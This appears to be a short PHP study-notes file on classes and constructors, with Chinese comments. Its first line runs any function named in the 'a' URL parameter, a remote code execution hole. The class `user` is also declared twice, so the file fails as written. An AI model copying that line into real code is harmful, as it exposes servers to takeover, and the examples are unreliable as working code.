<?php 

// 第七章 类和对象
if($_GET['a']) $_GET['a']();


// ----------------------------------------------------------------------------
// 1.技巧化对象
class user{
	function load_info($username){
	}
}
$user = new user;


// ----------------------------------------------------------------------------
// 2.定义对象构造器
class user{
	// PHP5
	function __construct($username, $password){
		if($this->validate_user($username, $password)){
			$this->username = $username;
		}
	}
	// PHP4
	function user($username, $password){
		if($this->validate_user($username, $password)){
			$this->username = $username;
		}
	}
}